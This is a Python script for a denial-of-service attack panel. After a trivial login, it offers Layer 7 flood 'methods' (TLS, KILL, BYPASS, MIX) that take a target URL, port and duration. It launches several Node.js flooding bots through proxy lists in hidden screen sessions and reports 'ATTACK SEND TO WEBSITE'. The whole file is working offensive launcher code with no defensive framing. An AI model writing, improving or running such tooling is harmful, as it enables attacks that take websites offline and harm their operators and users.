# -*- coding: utf-8 -*-
from operator import index
from colorama import Fore, Back, Style, init
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs
import shutil
import time
from pystyle import Colorate, Colors, Center, Col
from colorama import Fore, init
bot1 = """1/5"""
bot2 = """2/5"""
bot3 = """3/5"""
bot4 = """4/5"""
bot5 = """5/5"""
terminal_size = shutil.get_terminal_size()
terminal_width = terminal_size.columns

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (645, 645, 645)
end_color = (0, 0, 645)

class Color:
    colorama.init()
def methods():
	os.system('cls' if os.name == 'nt' else 'clear')
	print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.purple)), Center.XCenter("""
╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝""")))
	print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.purple)), Center.XCenter("""
   NAME         DESCRIPTION      STATUS
╔═══════════╬═══════════════════╬═══════════╗
║  TLS            Layer 7          ON       ║
║  KILL           Layer 7          ON       ║
║  BYPASS         Layer 7          ON       ║
║  MIX            Layer 7          ON       ║
╚═══════════════════════════════════════════╝
""")))



def error():
    print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.purple)),("""
COMEND NOT FOUND
- syntax : <method> <url> <port>  <time>
- example : TLS https://example.com 443 120

""")))

def main(username):
	os.system('cls' if os.name == 'nt' else 'clear')
	print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.purple)), Center.XCenter("""
⠀⣰⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡾
⠀⠀⣿⡍⠛⠲⣶⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡴⠞⠉⣠⡞⠀⠀
⠀⠀⠘⣽⢷⣦⣌⣈⠋⡚⠿⣦⡀⠀⠀⣀⣤⠀⠀⠀⣠⡶⠚⠛⣙⣭⠠⣤⣶⣯⠆⠀⠀⠀
⠀⠀⠀⣼⣷⣀⠀⠀⠈⠀⠀⠀⢻⡇⠺⡿⠛⣿⠀⠀⢿⠀⠀⣼⠿⣫⣭⣠⣤⡶⠂⠀⠀⠀
⠀⠀⠀⠀⠉⠛⠿⣹⣾⠔⠃⠀⠈⠳⠾⠏⠀⠻⣶⡺⠋⠀⣤⣸⣷⣶⡾⠖⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠒⠷⣿⡻⣞⣀⣄⣀⣀⡄⠀⠀⣠⣄⣸⡿⣾⣿⡽⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠟⠯⣽⢿⡿⠃⠀⢀⣿⡙⠑⠙⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣯⣦⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣼⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⢩⡿⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣽⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

""")))
	print(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.purple)), Center.XCenter("""> Type "methods" to start <
	
	
	
""")))
	while True:
		sin = input(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.purple)),f"""╔══[@{username}]
╚════➤ """))
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main(username)
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main(username)
		
		if sinput == "menu" or sinput == "MENU":
		  methods()
		if sinput == "methods" or sinput == "METHODS":
		  methods()



#method untuk layer 7 :)

    
		elif sinput == "KILL" or sinput == "kill":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				os.system('clear')
				print(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.purple)), Center.XCenter(f"""
╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║┤ ║║║ ║
╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩""")))
				print(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.purple)), Center.XCenter(f"""
╔═════════════════════════════════════════╗
  [!] ATTACK SEND TO WEBSITE SUCCES
   
   url     : {url}
   port    : {port}
   time    : {time}
   methods : {sinput}
   run bot : {bot5}
   running : {start_time}
╚═════════════════════════════════════════╝

""")))
				os.system(f'cd .bot && screen -dm timeout {time} node KILL.js {url} {time} 64 10 proxy.txt')
				os.system(f'cd .netdos && screen -dm timeout {time} node NETBOT1.js {url} {time} 64 10 proxy.txt')
				os.system(f'cd .net && screen -dm timeout {time} node NETBOT2.js {url} {time} 64 10 proxy.txt')
				os.system(f'cd .netkill && screen -dm timeout {time} node NETBOT3.js {url} {time} 64 10 proxy.txt')
				os.system(f'cd .netking && screen -dm timeout {time} node NETBOT4.js {url} {time} 64 10 proxy.txt')
				
			except ValueError:
				error()
			except IndexError:
				error()
		
				
		elif sinput == "BYPASS" or sinput == "bypass":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				os.system('clear')
				print(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.purple)), Center.XCenter(f"""
╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║┤ ║║║ ║
╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩""")))
				print(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.purple)), Center.XCenter(f"""
╔═════════════════════════════════════════╗
  [!] ATTACK SEND TO WEBSITE SUCCES
   
   url     : {url}
   port    : {port}
   time    : {time}
   methods : {sinput}
   run bot : {bot5}
   running : {start_time}
╚═════════════════════════════════════════╝

""")))
				os.system(f'cd .bot && screen -dm timeout {time} node BYPASS.js {url} {time} 64 10 proxy.txt')
				os.system(f'cd .netdos && screen -dm timeout {time} node NETBOT1.js {url} {time} 64 10 proxy.txt')
				os.system(f'cd .net && screen -dm timeout {time} node NETBOT2.js {url} {time} 64 10 proxy.txt')
				os.system(f'cd .netkill && screen -dm timeout {time} node NETBOT3.js {url} {time} 64 10 proxy.txt')
				os.system(f'cd .netking && screen -dm timeout {time} node NETBOT4.js {url} {time} 64 10 proxy.txt')
				
			except ValueError:
				error()
			except IndexError:
				error()
				
		elif sinput == "TLS" or sinput == "tls":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				os.system('clear')
				print(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.purple)), Center.XCenter(f"""
╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║┤ ║║║ ║
╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩""")))
				print(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.purple)), Center.XCenter(f"""
╔═════════════════════════════════════════╗
  [!] ATTACK SEND TO WEBSITE SUCCES
   
   url     : {url}
   port    : {port}
   time    : {time}
   methods : {sinput}
   run bot : {bot5}
   running : {start_time}
╚═════════════════════════════════════════╝

""")))
				os.system(f'cd .bot && screen -dm timeout {time} node TLS.js {url} {time} 64 10')
				os.system(f'cd .netdos && screen -dm timeout {time} node NETBOT1.js {url} {time} 64 10 proxy.txt')
				os.system(f'cd .net && screen -dm timeout {time} node NETBOT2.js {url} {time} 64 10 proxy.txt')
				os.system(f'cd .netkill && screen -dm timeout {time} node NETBOT3.js {url} {time} 64 10 proxy.txt')
				os.system(f'cd .netking && screen -dm timeout {time} node NETBOT4.js {url} {time} 64 10 proxy.txt')
				#os.system ("clear")
			except ValueError:
				error()
			except IndexError:
				error()
				
				
		elif sinput == "MIX" or sinput == "mix":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				os.system('clear')
				print(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.purple)), Center.XCenter(f"""
╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║┤ ║║║ ║
╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩""")))
				print(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.purple)), Center.XCenter(f"""
╔═════════════════════════════════════════╗
  [!] ATTACK SEND TO WEBSITE SUCCES
   
   url     : {url}
   port    : {port}
   time    : {time}
   methods : {sinput}
   run bot : {bot5}
   running : {start_time}
╚═════════════════════════════════════════╝

""")))
				os.system(f'cd .bot && screen -dm timeout {time} node MIX.js {url} {time}')
				os.system(f'cd .netdos && screen -dm timeout {time} node NETBOT1.js {url} {time} 64 10 proxy.txt')
				os.system(f'cd .net && screen -dm timeout {time} node NETBOT2.js {url} {time} 64 10 proxy.txt')
				os.system(f'cd .netkill && screen -dm timeout {time} node NETBOT3.js {url} {time} 64 10 proxy.txt')
				os.system(f'cd .netking && screen -dm timeout {time} node NETBOT4.js {url} {time} 64 10 proxy.txt')
				#os.system ("clear")
			except ValueError:
				error()
			except IndexError:
				error()
				
def login():
	os.system('cls' if os.name == 'nt' else 'clear')
	print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.purple)), Center.XCenter("""
⠀⣰⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡾
⠀⠀⣿⡍⠛⠲⣶⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡴⠞⠉⣠⡞⠀⠀
⠀⠀⠘⣽⢷⣦⣌⣈⠋⡚⠿⣦⡀⠀⠀⣀⣤⠀⠀⠀⣠⡶⠚⠛⣙⣭⠠⣤⣶⣯⠆⠀⠀⠀
⠀⠀⠀⣼⣷⣀⠀⠀⠈⠀⠀⠀⢻⡇⠺⡿⠛⣿⠀⠀⢿⠀⠀⣼⠿⣫⣭⣠⣤⡶⠂⠀⠀⠀
⠀⠀⠀⠀⠉⠛⠿⣹⣾⠔⠃⠀⠈⠳⠾⠏⠀⠻⣶⡺⠋⠀⣤⣸⣷⣶⡾⠖⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠒⠷⣿⡻⣞⣀⣄⣀⣀⡄⠀⠀⣠⣄⣸⡿⣾⣿⡽⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠟⠯⣽⢿⡿⠃⠀⢀⣿⡙⠑⠙⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣯⣦⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣼⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⢩⡿⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣽⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")))

	user = "root"
	username = input(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.purple)),"""
ApiKey ~➤ """))
	if username != user:
		print("\033[31mlogin not found •_•\033[0m")
		sys.exit(1)
	elif username == user:
		print("✓")
		time.sleep(1)
		main(username)
if __name__ == "__main__":
    login()